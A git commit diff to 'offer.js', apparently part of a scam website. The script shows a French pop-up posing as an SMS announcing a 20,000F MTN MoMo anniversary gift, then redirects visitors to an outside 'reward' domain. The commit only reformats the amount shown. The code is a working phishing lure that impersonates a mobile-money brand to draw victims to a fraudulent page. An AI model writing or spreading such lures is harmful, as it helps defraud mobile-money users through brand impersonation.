b02ebe445e336f504bb1bef1a5f179d4a5d1051d
lagboyme <lagboy33+me@gmail.com>
2025-07-26 04:59:43 +0100

    Update offer.js

--- offer.js
+++ offer.js
@@ -1,6 +1,6 @@
 /* Password Protection Script by www.onlineofferz.xyz*/
 var password = '20.000F'
-password=prompt('SMS : Félicitations, votre compte MTN MoMo est éligible pour recevoir le cadeau anniversaire de 20 000F, veuillez cliquer sur OK POUR CONTINUER');
+password=prompt('SMS : Félicitations, votre compte MTN MoMo est éligible pour recevoir le cadeau anniversaire de 20.000F, veuillez cliquer sur OK POUR CONTINUER');
 if (password != '20.000F') {
 location.href='https://mobilis-reward.goprogram.xyz/Gift';
 }
